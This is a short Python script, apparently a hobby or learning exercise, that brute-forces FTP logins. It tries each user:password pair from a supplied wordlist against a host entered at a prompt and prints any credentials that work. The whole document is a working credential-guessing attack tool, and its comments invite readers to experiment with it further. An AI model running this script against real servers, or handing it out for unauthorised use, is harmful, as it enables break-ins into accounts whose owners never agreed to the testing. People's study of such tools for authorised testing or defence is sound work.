# Simple ftp user and password bruteforcer
# can also be build by "pexpect" but have a dedicated library
# can try different and advanced way to script it (Experiment as you want)

#!/usr/bin/python3

import ftplib



def login_ftp(host,passwordList):
	try:
		passwd = open(passwordList,'r')
	except:
		print("[-] File does not Exist!")
		
	for line in passwd.readlines():
		line = line.strip('\n')
		user,pswd = line.split(':')
		try:
			ftp = ftplib.FTP(host)
			ftp.login(user,pswd)
			print("[+] login successful")
			print(f"[ user: {user} password:{pswd}]")
			ftp.quit()
		except:
			print("[-] login failed")

hostIP = input("host IP address: ")
passwd = input("password file: ")
login_ftp(hostIP, passwd)